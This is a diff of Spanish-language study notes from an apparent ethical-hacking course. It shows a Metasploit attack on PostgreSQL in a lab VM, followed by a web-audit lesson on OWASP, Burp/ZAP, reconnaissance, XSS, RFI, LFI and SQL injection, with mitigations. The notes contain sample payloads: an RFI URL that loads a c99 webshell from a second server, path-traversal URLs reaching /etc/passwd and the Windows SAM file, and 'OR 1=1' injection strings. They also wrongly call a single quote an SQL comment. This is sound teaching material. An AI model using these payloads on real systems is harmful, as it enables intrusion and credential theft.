@@ -272,3 +272,169 @@ Para ello primero explicaremos algunos conceptos básicos:
     - En el segundo método utilizaremos PostgreSQL que tiene de la versión 8.3.0 - 8.3.7, que tienen vulnerabilidades. Para ello utilizaremos el módulo `use auxiliary/scanner/postgres/postgres_login` el cual probará los diferentes usuarios y contraseñas por defecto que tiene PostgreSQL. De nuevo podemos ver las diferentes opciones con `show options` donde vemos la base de datos por defecto que se llama template1, el pass_file donde se almacenan los diccionarios de las contraseñas, . De nuevo establecemos la máquina de la víctima con `set RHOST 10.0.2.5` y ejecutamos con `run`. Podemos ver una lista de usuarios y contraseñas con los que ha intentado registrarse, donde vemos que con uno de ellos "postgres:postgres" lo ha conseguido en la base de datos "template1". Teniendo este usuario y contraseña y utilizando el módulo `use auxiliary/admin/postgres/postgres_sql` ejecutaeremos comandos de postgresql. Si ejecutamos `show options` vemos que ya tenemos seteado todo lo que necesitamos (bd, contraseña y usuario). De nuevo establecemos el host de la víctima `set RHOST 10.0.2.5` y ejecutamos `run`. Esto nos permitirá saber que la versión concreta de postgreSQL instalada es 8.3.1 y se encuentra en un sistema con Ubuntu. Ahora usando `use exploit/linux/postgres/postgres_payload` y comprobamos que las opciones se han establecido bien con `show options` (db, password, username) a falta del host con `set RHOST 10.0.2.5` y ejecutar `run`. El payload, que ya lo establecimos antes es el mismo y en esta ocasión también nos saca una terminal en la que si introducimos `shell` podemos de nuevo repetir el procedimiento `ls` y `whoami` donde esta vez somos el usuario "postgres" que tiene permisos de admin.
 
 
+### Tema 4.- Fallos de seguridad en mi web - Parte I
+
+Índice de esta sesión:
+1. Modelo conceptual de una Web
+2. Seguridad por diseño
+3. ¿Dónde empezar una auditoría Web?
+4. Metodología OWASP. OWASP Top 10
+5. Proxy Inverso: Burpsuite y ZAP
+6. Descubrimiento de información
+7. XSS: Cross Site Scripting
+8. RFI: Remote File Inclusion
+9. LFI: Local File Inclusion
+10. SQLi: SQL Injection
+11. RCE: Remote Code Execution
+12. Fuzzing: DirBuster, GoBuster...
+
+#### Modelo conceptual de una aplicación Web
+
+- Interfaz -> Entrada y salida de datos (Front-end)
+- Proceso -> Operaciones del código fuente y configuraciones del servidor (formularios, peticiones...)
+- Datos -> Sistemas gestores de bases de datos
+
+#### Prácticas de Programación Segura. Seguridad por diseño. 
+
+Deben aplicarse las políticas de seguridad dentro de la arquitectura del software a implementar teniendo en cuenta que hay que analizar todo el código durante el ciclo de vida del desarrollo para obtener código seguro.
+
+¿Cómo llevamos a cabo esto? Siguiendo una serie de puntos de desarrollo de Web Seguro:
+- Evaluación de riesgos - Los datos de los usuarios pueden estar en riesgo. Cuál es el valor de mis activos, etc.
+- Autenticación - Gestión de usuarios y contraseñas
+- Autorización y Control de Acceso - Gestión de roles y permisos de cada usuario
+- Administración de sesiones 
+- Validación de datos de entrada - Validación en cada capa de los datos de entrada en formularios, peticiones, llamadas, etc.
+- Desbordamiento de buffer - Control y administración de peticiones, llamadas, etc.
+- Uso inseguro de criptografía - No usar cifrados no seguros o que se puedan descifrar.
+- Manejo de errores - No solo para que sea más amigable el error de cara al usuario sino para no dar información al atacante.
+- Logging - Control de histórico de la actividad en la web. 
+- Administración remota - Posibilidad de control mediante ssh por ejemplo de la máquina que aloja la web (o parte de ella).
+- Aplicaciones Web y Configuraciones del Servidor - Protección no solo del código de la web sino del propio servidor. Llevar a cabo una segurización del mismo.
+
+Otras consideraciones:
+- Modelado de Amenazas: determinar activos y evaluar los riesgos.
+- Seguridad Simple: modelar una estructura simple de seguridad. Generar una capa simple de seguridad en cada capa. La unión hará la fuerza.
+- Defensa en Profundidad: tener varias capas de seguridad por si alguna falla.
+- Menor privilegio: cada usuario tiene que tener los mínimos privilegios.
+- Seguridad Positiva: hacer uso de listas blancas. A la consola de administración del backend solo pueden entrar una serie de IPs.
+- Fallar de forma segura: controlar los fallos y no dar información alguna a los atacantes
+- Evitar la Seguridad por Oscuridad: ocultar a un banner de un servicio o puerto no implica que estés a salvo.
+- Corrección completa: llevar a cabo el hardening del servidor antes de su puesta online.
+
+#### ¿Dónde empezar una auditoría Web?
+
+En general depende del objetivo, aunque se suelen buscar los siguientes elementos:
+1. Vulnerabilidades y fallos de configuración en la propia Aplicación Web
+2. Vulnerabilidades y fallos de configuración en el Servidor
+3. Comunicaciones inseguras entre Cliente y Servidor. Comunicaciones entre servicios.
+
+#### Metodología OWASP. OWASP Top 10
+
+Enlaces de interés:
+- https://owasp.org/www-project-top-ten/
+- https://wiki.owasp.org/images/5/5e/OWASP-Top-10-2017-es.pdf
+- https://sourceforge.net/projects/owaspbwa/
+
+Cuando llevamos a cabo una auditoría Web lo normal es seguir una metodología. Entre ellas se encuentra OWASP (Open Web Application Security Project). Dentro de este proyecto se definen una serie de erorres o riesgos más comunes o que debemos tener en cuenta (Top Ten) así como distintas check lists o elementos a comprobar uno a uno en nuestra web.
+
+¿Pero cómo podemos empezar a practicar las auditorías Webs? Si empezamos a comprobar o atacar webs estamos cometiendo un delito, por ello debemos utilizar máquinas virtuales. Para ello podemos usar OWASP Broken Web Application, es una máquina virtual Linux que tiene fallos de seguridad Web intencionales para que practiquemos. Además si nos metemos en la dirección 192.168.252.130 en nuestro navegador donde podemos obtener diferentes MV, nosotros usaremos la "Damn Vulnerable Web Application" con usuario y contraseña "admin".
+
+#### Proxy inverso: Burpsuite y ZAP
+
+En un escenario normal un cliente realiza una petición por medio de una URL a un servidor web y el servidor le envía la respuesta al cliente (que contendrá HTML, CSS y/o Javascript). No obstante por medio de un proxy inverso (como Burpsuite o OWASP ZAP) que se instalaría en la máquina del cliente en el localhost hacemos que la petición del cliente vaya primero al Proxy Local donde se puede modificar la petición (en concreto el javascript) y esta ser enviada al servidor web que envía la respuesta de nuevo, al cliente. Con ello podemos modificar el control de javascript del usuario que no es demasiado seguro.
+
+Si por ejemplo usamos ZAP nos iríamos a la pestaña de Herramientas > Opciones > Proxies Locales donde vemos que la dirección es localhost y el puerto el 8080. Ahora tenemos que conseguir que las peticiones que salen de nuestro navegador vayan primero a este proxy (redireccionarlas). Para ello nos iríamos a la configuración de nuestro navegador buscaríamos la opción de proxy y tenemos dos opciones. O bien utilizamos la extensión de Proxy SwitchySharp o bien configuraríamos manualmente el proxy en nuestro sistema introduciendo la dirección (127.0.0.1) y el puerto (8080). En este caso lo haremos usando la extensión y mediante click derecho y configuración añadimos el proxy aportando el nombre que queramos para el proxy, dirección y puerto. A partir de este momento, si accedemos a una web (como c1b3rwall.es) ZAP nos lo va a mostrar (URLs, métodos, cabeceras, etc.) y además en el navegador nos saldrá un mensaje avisándonos de que la conexión no es segura. Eso es porque nota que hay un intermediario entre la conexión que está escuchando (en este caso ZAP). Como último apunte de ZAP hay una opción de Automate Scan al que se le pasa una web y realiza una serie de peticiones para comprobar la seguridad de la misma.
+
+Pasamos ahora a usar BurpSuite, en la pestaña Proxy > Options podemos configurar nuestro Proxy al igual que lo hicimos antes y vemos que podemos interceptar las peticiones y modificarlas a nuestro gusto. Un ejemplo de modificación interesante sería modificar nuestro User Agent para dejar menos información sobre nosotros.
+
+En ambos casos, ¿cómo podemos evitar el aviso en el navegador de que la conexión no es segura? Por medio de un certificado que podemos descargar en la dirección y puerto en el que se está ejecutando el proxy (127.0.0.1/8080), importandolo en el programa y añadiéndolo en el navegador. 
+
+#### Descubrimiento de información / Information Gathering
+
+- Whois - Para ver a nombre de quién estaba el servicio webs
+- Carpetas Robots.txt - Fichero que usan las arañas de los buscadores con los que podemos ver qué información quieres indexar y qué no.
+- Metadatos (Foca) 
+- Indexación de Google y Shodan 
+- Dominio compartido/dedicado - Para comprobar si una web tiene un dominio compartido o dedicado basta con obtener la ip de la web (por ejemplo por medio del comando ping) y podemos usar el navegador bing de Microsoft que tiene un operador ip con el que podemos buscar ip:my_ip y ver si nos salen más resultados que la web que hemos buscado. 
+- Correos de Usuario (Hunter o theHarvester)
+- Directory Listing - Es un problema de configuración de servidor mediante el que podemos listar el contenido de los directorios de un servidor web (https://allpentesting.es/2020/04/19/analizando-phishing-bankinter/)
+- Subdominios en el servidor (dnsmap)
+- Sondeo de firewall wafwoof - Con la herramienta wafwoof de Kali  
+- Histórico de la Web con Netcraft 
+- Info de la Web (whatweb) - Para obtener información de la tecnología que usa una web en kali.
+
+#### XSS: Cross Site Scripting
+
+Veamos en qué consiste un ataque de inyección de XSS:
+- Objetivo: Inyectar código (JavaScript) para engañar al usuario o suplantar su identidad de tal forma que realice una acción no deseada. Esto se lleva a cabo por medio del uso de cualquier tipo de input en una web (no solo formularios sino incluso por medio del User-Agent).
+- Afectado: el usuario, que si realiza las acciones puede dar acceso al servidor.
+    - Ejemplo: Mandar un mensaje al administrador de un sitio Web aprovechando una vulnerabilidad del sitio y así robar la cookie de sesión del administrador.
+- ¿Cómo detectarlo? Una página es vulnerable a XSS cuando aquello que nosotros enviamos al servidor se ve posteriormente mostrado en la página de respuesta. En este punto de ataque podemos probar a inyectar el típico: `<script> alert("HolaMundo"); </script>`. Por ejemplo si en la MV que hemos mencionado antes "Damn Vulnerable Web Application" > XSS reflected insertamos lo anterior veremos que no está protegido.
+- Tipos de XSS:
+    - Permanente: La inyección de código queda almacenada en una base de datos y siempre se ejecuta el script cuando se accede a la zona vulnerable donde se ha producido la inyección. Podemos ver un ejemplo en la MV anterior > XSS stored si en el message inyectamos código.
+    - No permanente: La inyección de código no se almacena y por tanto hay que explotarla cada vez. Son las más comunes dentro de las XSS.
+- Solución: Filtros XSS
+    - Escapar los caracteres, de tal forma que una comilla o doble comilla la transformamos en /' o /''
+    - Uso de funciones como:
+        - strip_tags() que elimina entidades php y html
+        - htmlspecialchars() que convierte caracteres especiales a HTML.
+
+#### RFI: Remote File Inclusion
+
+Veamos en qué consiste un ataque de inclusión de ficheros remotos (RFI):
+- Objetivo: Ejecución de código remoto dentro de la aplicación vulnerable. Al igual que un fichero se puede cargar de forma local para incluirlo en la Web, podríamos cargar uno con código malicioso. Ojo con los lenguajes interpretados. Ejemplo: http://www.mipagina.com/mostrar.php?pag=paginaMaliciosa.php
+- Funciones vulnerables que no se deben utilizar en el código:
+    - include($pag)
+    - require($pag)
+    - include_once($pag)
+    - require_once($pag)
+- Configuración vulnerable que no se debe utilizar en el servidor:
+    - allow_url_fopen()
+    - allow_url_include()
+    - register_globals()
+- Ejemplo de RFI: Un ejemplo un poco más complejo y peligroso es el de que un cracker envíe una petición a un servidor 1 con `http://server1/index.php?page=http://server2/c99.txt` donde le estamos diciendo que ejecute el código del fichero c99.txt de un segundo servidor. Ese código en concreto se ejecutará el servidor 1 y dejará abierta una backdoor. Como respuesta a la petición del cracker le llegará por parte del servidor una webshell con la que podrá conseguir control total del servidor 1. 
+- Otro ejemplo: Si usamos la MV de antes > File Inclusion y cambiamos la url del page por marca.com y entonces vemos que se nos redirige a esa página. Incluso podemos ejecutar el c99 si lo buscamos en github y lo insertamos ahí.
+- Solución: Evitar las funciones y configuraciones antes mencionadas.
+
+#### LFI: Local File Inclusion
+
+- Objetivo: Incluir dentro de la página Web un fichero local (con permiso de lectura) del usuario con el que se ejecuta el servidor de aplicaciones Web. Esto pasa tanto con lenguajes compilados como interpretados.
+- Sitios expuestos:
+    - Páginas web de plantillas: Cambia un fichero desde otro y da formato.
+    - Páginas de descargas: Recibe un parámetro con el nombre del fichero a descargar y lo manda al cliente.
+- Ejemplo de explotación: Accedemos a un fichero del sistema subiendo directorios ..\ o ../ según sea Windows o Linux más el nombre del fichero. 
+    - Si tenemos una web cuyo uso normal sería subir la página deportes.php -> http://www.victima.com/noticias/detalle.php?id=4&tipo=deportes.php
+    - La podemos cambiar por archivos como http://www.victima.com/noticias/detalle.php?id=4&tipo=../../../../etc/passwd
+    - http://www.victima.com/noticias/detalle.php?id=4&tipo=../../../etc/hosts
+    - http://www.victima.com/noticias/detalle.php?id=4&tipo=..\..\..\Windows\repair\SAM
+- Ejemplo concreto: Nos vamos a la MV de antes > File Inclusion y cambiamos la url y ponemos de ruta ../../ un montón de veces para asegurarnos subir hasta la raíz del sistema y luego /etc/passwd. 
+- Soluciones:
+    - Montar el servidor con el mínimo privilegio posible, limitando acceso a la propia carpeta.
+    - Hay que proteger los ficheros por medio de la programación no sólo por los permisos del servidor. A estos se puede acceder de manera:
+        - Directa -> poniendo la ruta. Por tanto eliminamos los \ y /
+        - Indirectamente -> poniendo ../ o ..\ por tanto eliminamos o escapamos los puntos y las barras.
+
+#### SQL Injection
+
+- Objetivo: Aprovechar conexiones a bases de datos desde aplicaciones web no securizadas para permitir a un atacante la ejecución de comandos directamente en la base de datos.
+- Ejemplo:
+    - SELECT * from Usuarios WHERE usuario=VARIABLE && clave=VARIABLE -> SELECT * from Usuarios WHERE usuario=admin && clave=1 OR 1=1
+- Entorno explotable:
+    - Fallo de comprobación de parámetros de entrada -> cualquier valor que venga del cliente (POST, GET, parámetros funciones JS, valores cabeceras HTTP o datos de las cookies).
+    - Uso de parámetros (no comprobados) en la construcción de llamadas a BBDD.
+    - Construcción no fiable de sentencias -> Concatenación de cadenas de caracteres
+- ¿Cómo podemos saber si una web es susceptible a este ataque? Intentando inyectar una comilla simple ' que es la manera de escribir comentarios en el lenguage de SQL. Si da error la página es que es susceptible. 
+- Límites de explotación:
+    - Las funcionalidades del SGBD
+    - Los privilegios de la cuenta que accede a los datos
+    - El conocimiento del atacante sobre el SGBD. 
+- Tipo de SQL Injection: Blind SQL Injection
+    - Ataque que consigue que los comandos se ejecuten sin ver los resultados.
+    - Obtenemos información mediante inferencias, de tal forma que debemos de detectar cambios según los parámetros introducidos. Uso de lógica binaria: True y False. 
+        - Ejemplo: Si el usuario admin existe para 5 segundos. No nos va a mostrar nada pero si detectamos que se ha detenido esos 5 segundos es que el usuario admin existe. 
+- Solución
+    - Comprobación de TODOS los datos que vengan desde el usuario.
+    - Uso de consultas precompiladas en la BBDD.
+    - Control de todos los errores realizando un tratamiento seguro del mismo, sin dar información.
+    - Uso de funciones por parte del servidor para securizar: mysqli_real_escape_string y filter_input.  
+
